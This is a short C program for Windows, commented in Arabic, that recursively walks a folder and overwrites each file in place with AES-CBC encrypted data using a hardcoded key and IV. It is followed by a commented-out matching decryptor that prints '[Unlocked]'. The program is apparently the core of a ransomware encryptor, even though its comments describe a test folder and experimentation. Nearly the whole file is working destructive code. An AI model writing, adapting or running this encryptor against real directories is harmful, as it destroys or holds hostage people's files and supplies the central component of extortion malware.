#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include "aes.h"

// إعدادات التشفير
#define AES_KEY_SIZE 16
#define BLOCK_SIZE 16

// مفتاح ثابت ومتجه ابتدائي (لأغراض التجربة فقط)
uint8_t key[16] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };
uint8_t iv[16]  = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };

void encrypt_single_file(const char* filePath) {
    FILE *f = fopen(filePath, "rb+");
    if (!f) return;

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);

    uint8_t buffer[BLOCK_SIZE];
    while (fread(buffer, 1, BLOCK_SIZE, f) == BLOCK_SIZE) {
        AES_CBC_encrypt_buffer(&ctx, buffer, BLOCK_SIZE);
        fseek(f, -BLOCK_SIZE, SEEK_CUR);
        fwrite(buffer, 1, BLOCK_SIZE, f);
        fseek(f, 0, SEEK_CUR); // لضمان استقرار المؤشر
    }
    fclose(f);
    printf("[Done] Encrypted: %s\n", filePath);
}

void traverse_and_encrypt(const char* folderPath) {
    char searchPath[MAX_PATH];
    sprintf(searchPath, "%s\\*", folderPath);

    WIN32_FIND_DATA fd;
    HANDLE hFind = FindFirstFile(searchPath, &fd);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        // تجاهل المجلدات الحالية والعليا
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        char fullPath[MAX_PATH];
        sprintf(fullPath, "%s\\%s", folderPath, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // إذا كان مجلداً، ادخله (الاستدعاء الذاتي)
            traverse_and_encrypt(fullPath);
        } else {
            // إذا كان ملفاً، قم بتشفيره
            encrypt_single_file(fullPath);
        }
    } while (FindNextFile(hFind, &fd));

    FindClose(hFind);
}
/* // ... (نفس التعريفات والمكتبات في كود ويندوز السابق)

void decrypt_single_file(const char* filePath) {
    FILE *f = fopen(filePath, "rb+");
    if (!f) return;

    struct AES_ctx ctx;
    // يجب استخدام نفس Key و IV المستخدمين في التشفير
    AES_init_ctx_iv(&ctx, key, iv);

    uint8_t buffer[BLOCK_SIZE];
    while (fread(buffer, 1, BLOCK_SIZE, f) == BLOCK_SIZE) {
        // الوظيفة العكسية هنا
        AES_CBC_decrypt_buffer(&ctx, buffer, BLOCK_SIZE);
        
        fseek(f, -BLOCK_SIZE, SEEK_CUR);
        fwrite(buffer, 1, BLOCK_SIZE, f);
        fseek(f, 0, SEEK_CUR);
    }
    fclose(f);
    printf("[Unlocked] Decrypted: %s\n", filePath);
}

// دالة traverse_and_encrypt تبقى كما هي مع تغيير استدعاء decrypt_single_file
*/
int main() {
    // حدد مسار مجلد اختبار آمن هنا
    const char* targetFolder = "C:\\TestFolder"; 
    
    printf("Starting encryption in: %s\n", targetFolder);
    traverse_and_encrypt(targetFolder);
    
    return 0;
}
